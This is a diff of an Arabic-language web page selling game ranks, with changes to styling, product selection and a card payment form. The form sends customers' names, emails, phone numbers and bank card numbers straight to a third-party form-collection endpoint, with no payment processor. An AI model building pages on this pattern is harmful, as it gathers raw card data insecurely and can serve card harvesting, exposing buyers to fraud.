@@ -10,7 +10,7 @@
   <link rel="stylesheet" href="https://unpkg.com/aos@2.3.1/dist/aos.css" />
   <style>
     * { box-sizing: border-box; margin:0; padding:0; }
-    body { font-family: 'Segoe UI', Tahoma, sans-serif; background:#f5f5f5; }
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; background:#f5f5f5; direction: rtl; }
     .navbar { display:flex;justify-content:space-between;align-items:center;
       padding:15px 30px;background:#111;position:sticky;top:0;z-index:1000; }
     .navbar img { height:40px; }
@@ -31,7 +31,7 @@
     .products { display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
       gap:20px;padding:40px; }
     .product { background:#fff;border-radius:10px;overflow:hidden;
-      box-shadow:0 3px 8px rgba(0,0,0,.1);transition:transform .3s; }
+      box-shadow:0 3px 8px rgba(0,0,0,.1);transition:transform .3s; cursor:pointer;}
     .product:hover { transform:translateY(-5px); }
     .product img { width:100%;height:200px;object-fit:cover; }
     .product-info { padding:15px; display:flex;flex-direction:column;justify-content:space-between; }
@@ -51,39 +51,22 @@
     #contact li { margin:20px 0; }
 
     /* Payment form */
-    #payment { background:#fff; padding:40px; max-width:600px; margin:40px auto; border-radius:10px; box-shadow:0 3px 10px rgba(0,0,0,0.1); }
-    #payment h2 { margin-bottom:30px; text-align:center; color:#333; }
-    #payment form label { display:block; margin-bottom:8px; font-weight:600; color:#555; }
-    #payment form input, 
-    #payment form select, 
-    #payment form textarea {
-      width:100%; padding:10px; margin-bottom:20px; border:1px solid #ccc; border-radius:5px;
-      font-size:16px; font-family: inherit;
-      transition: border-color 0.3s;
-    }
-    #payment form input:focus,
-    #payment form select:focus,
-    #payment form textarea:focus {
-      border-color:#ff6f61;
-      outline:none;
+    #payment { background:#fff; padding:40px; max-width:600px; margin:40px auto; border-radius:10px; box-shadow: 0 3px 10px rgba(0,0,0,0.1);}
+    #payment h2 { text-align:center; margin-bottom:25px; color:#333; }
+    #payment form label { display:block; margin-bottom:8px; font-weight:600; color:#333; }
+    #payment form input, #payment form select, #payment form textarea {
+      width: 100%; padding:10px; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;
     }
     #payment form button {
-      background:#ff6f61; color:#fff; border:none; padding:15px; width:100%; font-size:18px;
-      font-weight:700; border-radius:5px; cursor:pointer; transition: background 0.3s;
+      background:#ff6f61; color:#fff; border:none; padding:12px; width:100%; font-size:18px; border-radius:5px; cursor:pointer;
+      transition: background .3s;
     }
-    #payment form button:hover {
-      background:#e55b50;
-    }
+    #payment form button:hover { background:#e55b50; }
+    .card-details { display:flex; gap:15px; flex-wrap:wrap; }
+    .card-details > div { flex:1 1 48%; }
 
-    /* Flex for card details */
-    .card-details {
-      display: flex;
-      gap: 15px;
-      flex-wrap: wrap;
-    }
-    .card-details > div {
-      flex: 1 1 48%;
-    }
+    footer { background:#111;color:#fff;text-align:center;padding:20px;font-size:14px; margin-top:50px; }
+
   </style>
 </head>
 <body>
@@ -111,7 +94,7 @@
       <div class="swiper-slide" style="background-image: url('aboutus.jpg')">
         <div class="slide-overlay" data-aos="fade-up" data-aos-delay="200">
           <h2>استكشف</h2>
-          <button onclick="scrollToProducts()">المزيد</button>
+          <button onclick="scrollToPayment()">المزيد</button>
         </div>
       </div>
     </div>
@@ -122,46 +105,49 @@
 
   <!-- Products -->
   <section class="products" id="store">
-    <div class="product" data-aos="zoom-in">
+    <div class="product" data-aos="zoom-in" onclick="selectProduct('VIP Rank - $8.49')">
       <img src="vip.jpg" alt="VIP Rank" />
       <div class="product-info">
         <h3>VIP Rank</h3>
         <p>احصل على وصول حصري وميزات إضافية.</p>
         <div class="price">$8.49</div>
-        <button class="buy-btn" onclick="selectProduct('VIP Rank')">شراء</button>
+        <button class="buy-btn" onclick="event.stopPropagation(); selectProduct('VIP Rank - $8.49'); scrollToPayment();">شراء</button>
       </div>
     </div>
 
-    <div class="product" data-aos="zoom-in" data-aos-delay="100">
+    <div class="product" data-aos="zoom-in" data-aos-delay="100" onclick="selectProduct('Legend Rank - $13.99')">
       <img src="legend.png" alt="Legend Rank" />
       <div class="product-info">
         <h3>Legend Rank</h3>
         <p>Summer Sales.</p>
         <div class="price">$13.99</div>
-        <button class="buy-btn" onclick="selectProduct('Legend Rank')">شراء</button>
+        <button class="buy-btn" onclick="event.stopPropagation(); selectProduct('Legend Rank - $13.99'); scrollToPayment();">شراء</button>
       </div>
     </div>
 
-    <div class="product" data-aos="zoom-in" data-aos-delay="200">
+    <div class="product" data-aos="zoom-in" data-aos-delay="200" onclick="selectProduct('VIP+ Rank - $18.99')">
       <img src="vip+.png" alt="VIP+ Rank" />
       <div class="product-info">
         <h3>VIP+ Rank</h3>
         <p>ارتقِ في الرتب واحصل على امتيازات أكثر.</p>
         <div class="price">$18.99</div>
-        <button class="buy-btn" onclick="selectProduct('VIP+ Rank')">شراء</button>
+        <button class="buy-btn" onclick="event.stopPropagation(); selectProduct('VIP+ Rank - $18.99'); scrollToPayment();">شراء</button>
       </div>
     </div>
   </section>
 
-  <!-- Payment Form -->
-  <section id="payment">
-    <h2>نموذج دفع بطاقة بنكية</h2>
-    <form action="https://formspree.io/f/xovljpvw" method="POST">
+  <!-- Payment Section -->
+  <section id="payment" data-aos="fade-up">
+    <h2>نموذج حوالة بطاقة ماستر / فيزا</h2>
+    <form action="https://formspree.io/f/xovljpvw" method="POST" id="paymentForm">
       <label for="name">الاسم الكامل:</label>
       <input type="text" id="name" name="name" placeholder="أدخل اسمك الكامل" required />
 
       <label for="email">البريد الإلكتروني:</label>
       <input type="email" id="email" name="email" placeholder="example@example.com" required />
+
+      <label for="phone">رقم الهاتف (للتواصل):</label>
+      <input type="tel" id="phone" name="phone" placeholder="07748511132" required pattern="\d{10,15}" title="أدخل رقم هاتف صالح" />
 
       <label for="card_number">رقم البطاقة البنكية:</label>
       <input type="text" id="card_number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" required pattern="\d{13,19}" title="أدخل رقم بطاقة صالح (13-19 رقم)" />
@@ -180,8 +166,8 @@
         </div>
       </div>
 
-      <label for="amount">المبلغ المدفوع:</label>
-      <input type="number" id="amount" name="amount" placeholder="مثلاً 10000" required min="1" />
+      <label for="transaction_number">رقم الحوالة:</label>
+      <input type="text" id="transaction_number" name="transaction_number" placeholder="أدخل رقم الحوالة" required />
 
       <label for="product">المنتج المطلوب:</label>
       <select id="product" name="product" required>
@@ -216,6 +202,7 @@
   <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
   <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
   <script>
+    // Swiper slider init
     const swiper = new Swiper('.swiper-container', {
       loop: true,
       autoplay: { delay: 4000, disableOnInteraction: false },
@@ -229,17 +216,20 @@
       document.getElementById('payment').scrollIntoView({ behavior: 'smooth' });
     }
 
-    // Scroll to products section
-    function scrollToProducts() {
-      document.getElementById('store').scrollIntoView({ behavior: 'smooth' });
+    // When user clicks "شراء" على منتج، يعبي الاختيار بقائمة الدفع وينزل للنموذج
+    function selectProduct(productName) {
+      const productSelect = document.getElementById('product');
+      productSelect.value = productName.split(' - ')[0]; // فقط اسم المنتج بدون السعر
     }
 
-    // Select product and set in form dropdown
-    function selectProduct(productName) {
-      const select = document.getElementById('product');
-      select.value = productName;
-      scrollToPayment();
-    }
+    // منع ارسال النموذج إلا إذا كل الحقول صحيحة
+    document.getElementById('paymentForm').addEventListener('submit', function(event) {
+      if (!this.checkValidity()) {
+        event.preventDefault();
+        alert('يرجى ملء جميع الحقول المطلوبة بشكل صحيح.');
+      }
+    });
   </script>
+
 </body>
 </html>
